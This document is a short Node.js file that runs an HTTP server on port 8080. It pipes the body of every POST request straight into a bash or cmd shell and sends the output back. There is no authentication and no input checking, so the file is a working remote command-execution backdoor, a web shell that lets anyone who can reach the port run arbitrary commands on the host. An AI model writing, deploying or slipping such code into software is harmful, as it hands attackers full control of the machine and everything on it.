const http = require('http');
const { spawn } = require('child_process');

const server = http.createServer((req, res) => {
 if (req.method === 'POST') {
    let data = '';
    req.on('data', chunk => {
      data += chunk;
    });
    req.on('end', () => {
      const command = data.toString().trim();
      console.log(`Received command: ${command}`);

      const shellCommand = process.platform === 'win32' ? 'cmd' : 'bash';
      const child = spawn(shellCommand);

      child.stdin.write(command + '\n');
      child.stdin.end();

      child.stdout.on('data', (output) => {
        res.write(output);
      });

      child.on('close', (code) => {
        console.log(`Child process exited with code ${code}`);
        res.end();
      });

      child.on('error', (error) => {
        console.error(`Error spawning child process: ${error.message}`);
        res.statusCode = 500;
        res.end(`Error spawning child process: ${error.message}`);
      });
    });
 } else {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Server running');
 }
});

const PORT = 8080;
server.listen(PORT, () => {
 console.log(`HTTP server running on port ${PORT}`);
});
